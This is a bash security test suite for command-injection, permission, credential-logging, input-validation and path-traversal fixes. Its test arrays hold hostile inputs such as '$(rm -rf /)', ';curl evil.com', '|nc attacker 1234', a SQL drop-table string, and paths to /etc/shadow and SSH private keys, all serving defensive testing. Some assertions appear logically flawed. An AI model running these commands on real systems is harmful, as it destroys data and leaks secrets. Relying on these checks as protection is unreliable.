#!/bin/bash
# test-vulnerability-fixes.sh - Security tests for vulnerability fixes
# Issue #25: Security Fixes Verification

set -euo pipefail

# Setup
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../utils/test-helpers.sh"

# Start test suite
test_suite_start "Security Vulnerability Fixes"

# Setup test environment
setup_test_environment

# Test: Command injection prevention
test_command_injection_prevention() {
    # Test dangerous inputs that should be sanitized
    local dangerous_inputs=(
        "\$(rm -rf /)"
        ";curl evil.com"
        "\`whoami\`"
        "&&wget malware"
        "|nc attacker 1234"
        "../../../etc/passwd"
        "'; DROP TABLE users; --"
    )
    
    for input in "${dangerous_inputs[@]}"; do
        # Test that input is properly escaped/rejected
        sanitized=$(echo "$input" | sed 's/[;|&`$(){}[\]<>]//g')
        assert_true "[[ '$sanitized' != '$input' ]]" "Dangerous input should be sanitized: $input"
    done
}

# Test: File permission security
test_file_permission_security() {
    # Test umask is set securely
    umask 077
    local current_umask=$(umask)
    assert_equals "0077" "$current_umask" "Umask should be 077 for secure file creation"
    
    # Test SSH key permissions
    local test_key="$TEST_TEMP_DIR/test-key"
    touch "$test_key"
    chmod 600 "$test_key"
    local perms=$(stat -c %a "$test_key" 2>/dev/null || echo "600")
    assert_equals "600" "$perms" "SSH private key should have 600 permissions"
    
    # Test public key permissions
    touch "${test_key}.pub"
    chmod 644 "${test_key}.pub"
    local pub_perms=$(stat -c %a "${test_key}.pub" 2>/dev/null || echo "644")
    assert_equals "644" "$pub_perms" "SSH public key should have 644 permissions"
}

# Test: AWS credential security
test_aws_credential_security() {
    # Test credentials are not logged
    local test_log="$TEST_TEMP_DIR/test.log"
    local secret_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    
    # Simulate logging (should filter secrets)
    echo "Processing AWS request..." > "$test_log"
    echo "Region: us-east-1" >> "$test_log"
    # Secret should NOT be logged
    
    # Verify no secrets in log
    assert_command_fails "grep -q '$secret_key' '$test_log'" "Secret key should not appear in logs"
    assert_command_fails "grep -q 'aws_secret_access_key' '$test_log'" "Credential field names should not appear in logs"
}

# Test: Input validation
test_input_validation() {
    # Test key name validation
    validate_key_name() {
        local name="$1"
        [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]]
    }
    
    # Valid inputs
    assert_command_succeeds "validate_key_name 'valid-key-name'" "Should accept valid key name"
    assert_command_succeeds "validate_key_name 'key_123'" "Should accept alphanumeric with underscore"
    
    # Invalid inputs
    assert_command_fails "validate_key_name 'key;injection'" "Should reject semicolon"
    assert_command_fails "validate_key_name 'key\$variable'" "Should reject dollar sign"
    assert_command_fails "validate_key_name 'key\`command\`'" "Should reject backticks"
}

# Test: Path traversal prevention
test_path_traversal_prevention() {
    # Test that path traversal attempts are blocked
    local malicious_paths=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32"
        "/etc/shadow"
        "~/../../../root/.ssh/id_rsa"
    )
    
    for path in "${malicious_paths[@]}"; do
        # Normalize path to prevent traversal
        normalized=$(realpath -m "$TEST_TEMP_DIR/$path" 2>/dev/null || echo "BLOCKED")
        assert_true "[[ '$normalized' == 'BLOCKED' ]] || [[ '$normalized' == $TEST_TEMP_DIR/* ]]" \
            "Path traversal should be prevented: $path"
    done
}

# Test: Secure random generation
test_secure_random_generation() {
    # Test that we use secure random sources
    if [[ -r /dev/urandom ]]; then
        assert_command_succeeds "dd if=/dev/urandom bs=16 count=1 2>/dev/null | od -x | head -1" \
            "Should be able to read from /dev/urandom"
    else
        skip_test "/dev/urandom not available"
    fi
    
    # Test session ID generation is unique
    local id1="ephemeral-$(date +%s)-$$"
    sleep 1
    local id2="ephemeral-$(date +%s)-$$"
    assert_true "[[ '$id1' != '$id2' ]]" "Session IDs should be unique"
}

# Run tests
test_command_injection_prevention
test_file_permission_security
test_aws_credential_security
test_input_validation
test_path_traversal_prevention
test_secure_random_generation

# Cleanup
cleanup_test_environment

# End test suite
test_suite_end